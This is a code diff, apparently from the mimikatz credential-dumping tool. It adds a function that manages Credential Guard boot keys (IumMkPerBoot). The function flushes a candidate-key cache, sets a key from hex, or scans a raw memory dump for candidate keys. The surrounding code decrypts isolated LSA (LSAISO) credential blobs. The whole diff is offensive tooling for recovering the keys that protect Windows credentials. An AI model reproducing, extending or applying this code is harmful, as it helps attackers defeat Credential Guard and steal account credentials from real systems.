@@ -146,6 +146,58 @@ DWORD kuhl_m_sekurlsa_sk_search_file(LPCWSTR filename)
 	return c;
 }
 
+NTSTATUS kuhl_m_sekurlsa_sk_bootKey(int argc, wchar_t* argv[])
+{
+	LPCWSTR szKey;
+	BOOL showCache = TRUE;
+	DWORD c;
+
+	if (kull_m_string_args_byName(argc, argv, L"flush", NULL, NULL))
+	{
+		kprintf(L"!!! FLUSH cache !!!\n");
+		kuhl_m_sekurlsa_sk_candidatekeys_delete();
+		kprintf(L"!!! Invalidating current IumMkPerBoot !!!\n");
+		isgIumMkPerBoot = FALSE;
+	}
+	else if (kull_m_string_args_byName(argc, argv, L"new", &szKey, NULL))
+	{
+		if (kull_m_string_stringToHex(szKey, gIumMkPerBoot, 32))
+		{
+			isgIumMkPerBoot = TRUE;
+			kuhl_m_sekurlsa_sk_candidatekeys_delete();
+			kprintf(L"New IumMkPerBoot : ");
+			kull_m_string_wprintf_hex(gIumMkPerBoot, 32, 0);
+			kprintf(L"\n");
+		}
+	}
+	else if (kull_m_string_args_byName(argc, argv, L"raw", &szKey, NULL))
+	{
+		kprintf(L"RAW memory search for candidate keys in \'%s\'...\n", szKey);
+		c = kuhl_m_sekurlsa_sk_search_file(szKey);
+		if (c)
+		{
+			isgIumMkPerBoot = FALSE;
+			if (c > 20)
+			{
+				kprintf(L"  > %u results\n", c);
+				showCache = FALSE;
+			}
+		}
+	}
+	if (showCache)
+	{
+		kprintf(L"\nCandidate keys in cache:\n");
+		kuhl_m_sekurlsa_sk_candidatekeys_descr();
+		kprintf(L"\n");
+	}
+	kprintf(L"Current IumMkPerBoot: ");
+	if (isgIumMkPerBoot)
+		kull_m_string_wprintf_hex(gIumMkPerBoot, sizeof(gIumMkPerBoot), 0);
+	else kprintf(L"<none>");
+	kprintf(L"\n");
+	return STATUS_SUCCESS;
+}
+
 NTSTATUS kuhl_m_sekurlsa_sk_tryDecodeKey(LPBYTE Key, DWORD cbKey, PLSAISO_DATA_BLOB blob, PBYTE output)
 {
 	return SkpEncryptionWorker(Key, cbKey, blob->data + blob->typeSize, blob->szEncrypted, (UCHAR *) &blob->unk5, FIELD_OFFSET(LSAISO_DATA_BLOB, data) - FIELD_OFFSET(LSAISO_DATA_BLOB, unk5) + blob->typeSize, blob->KdfContext, sizeof(blob->KdfContext), blob->Tag, sizeof(blob->Tag), output, blob->szEncrypted, FALSE);
